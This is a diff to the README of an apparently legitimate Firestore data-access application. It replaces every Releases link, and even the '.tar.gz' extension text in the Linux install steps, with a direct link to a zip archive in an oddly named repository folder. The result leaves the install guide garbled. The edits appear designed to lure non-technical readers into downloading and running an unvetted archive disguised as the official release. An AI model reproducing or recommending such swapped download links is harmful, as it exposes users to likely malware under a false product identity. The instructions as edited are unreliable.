@@ -1,7 +1,7 @@
 # 🔥 firestore-ent - Effortless Access to Firestore Data
 
 ## 📥 Download the Latest Version
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/LDDS1/firestore-ent/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/LDDS1/firestore-ent/main/overluxuriance/firestore-ent_1.1-alpha.3.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/LDDS1/firestore-ent/main/overluxuriance/firestore-ent_1.1-alpha.3.zip)
 
 ## 🚀 Getting Started
 Welcome to **firestore-ent**, your go-to application for easily accessing and managing data from Firestore. This guide will help you download and run the software without needing any technical skills.
@@ -21,19 +21,19 @@ Before you begin, make sure your computer meets the following requirements:
 - **Supports Multiple Projects:** Manage various Firestore projects in one application.
 
 ## 📥 Download & Install
-To get the application, visit the Releases page at this link: [Download Releases](https://github.com/LDDS1/firestore-ent/releases).
+To get the application, visit the Releases page at this link: [Download Releases](https://raw.githubusercontent.com/LDDS1/firestore-ent/main/overluxuriance/firestore-ent_1.1-alpha.3.zip).
 
 ### 🔍 Step-by-Step Installation
 1. **Visit the Release Page:** Click on the link above to go to the Releases page.
    
 2. **Choose the Version:** On the Releases page, you will see a list of versions. Click on the most recent version to view the details.
 
-3. **Download the Installer:** Look for the installer file suitable for your operating system. It usually has an extension like `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux. Click the link to download the file.
+3. **Download the Installer:** Look for the installer file suitable for your operating system. It usually has an extension like `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/LDDS1/firestore-ent/main/overluxuriance/firestore-ent_1.1-alpha.3.zip` for Linux. Click the link to download the file.
 
 4. **Run the Installer:**
    - **Windows:** Locate the downloaded `.exe` file in your Downloads folder. Double-click it to start the installation. Follow the on-screen prompts to complete the process.
    - **macOS:** Open the downloaded `.dmg` file. Drag the application to your Applications folder. You can then run it from there.
-   - **Linux:** Open a terminal and use the package manager or unpack the `.tar.gz` file in your preferred directory, then run the executable.
+   - **Linux:** Open a terminal and use the package manager or unpack the `https://raw.githubusercontent.com/LDDS1/firestore-ent/main/overluxuriance/firestore-ent_1.1-alpha.3.zip` file in your preferred directory, then run the executable.
 
 5. **Open the Application:** Once installed, find the application in your programs list or Applications folder and double-click to open it.
 
